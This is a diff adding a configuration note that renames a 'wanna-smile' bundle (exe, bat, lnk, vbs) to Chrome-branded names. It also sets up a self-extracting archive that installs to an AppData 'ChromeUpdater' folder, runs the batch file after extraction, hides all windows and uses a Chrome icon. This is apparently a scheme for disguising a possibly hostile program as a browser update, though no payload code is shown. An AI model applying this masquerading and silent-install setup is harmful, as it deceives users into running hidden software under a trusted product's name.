@@ -1,0 +1,34 @@
+'ChromeUpdater' is the code name for 'wanna-smile':
+
+	1. wanna-smile.exe => ChromeUpdater.exe
+	2. wanna-smile.bat => Chrome.exe
+	3. wanna-smile.lnk => ChromeUpdater.lnk
+	4. wanna-smile.vbs => update.vbs
+
+############################################################
+
+
+[+] Zipped file:
+	1. wanna-smile.exe
+	2. Chrome.bat
+	3. wanna-smile.lnk
+	4. wanna-smile.vbs
+
+
+[+] General:
+	Path: C:\Users\%username%\AppData\Local\Programs\ChromeUpdater
+
+
+[+] Install/Configure:
+	Run after extraction: wanna-smile.bat
+
+[+] Silent Mode: 
+	Hide All
+
+
+[+] Text & Icons: 
+	Icon: chrome.ico
+
+
+[+] Update: 
+	Overwriting Mode: skip already existing files
